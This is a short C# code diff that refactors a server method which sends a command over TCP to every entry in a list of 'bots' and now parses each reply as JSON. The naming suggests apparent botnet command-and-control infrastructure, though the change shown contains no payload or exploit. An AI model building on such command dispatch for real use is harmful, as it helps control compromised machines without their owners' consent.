@@ -3,17 +3,18 @@ using Alduin.Shared.DTOs;
 using Alduin.Server.Modules;
 using System;
 using System.Collections.Generic;
+using Newtonsoft.Json;
 
 namespace Alduin.Server.Handler
 {
     public class CommandExecute 
     {
-        public static List<string> TcpConnects(BotDTO[] botlist, string model)//Multi response
+        public static CommandResponseModel[] TcpConnects(BotDTO[] botlist, string model)//Multi response
         {
-            List<string> response = new List<string>();
+            CommandResponseModel[] response = new CommandResponseModel[botlist.Length];
             for (var i = 0; i < botlist.Length; i++)
             {
-                response.Add(Connecter.CreateTcpSend(botlist[i].Domain, model));
+                response[i] = JsonConvert.DeserializeAnonymousType(Connecter.CreateTcpSend(botlist[i].Domain, model), new CommandResponseModel());
             };
             return response;
         }
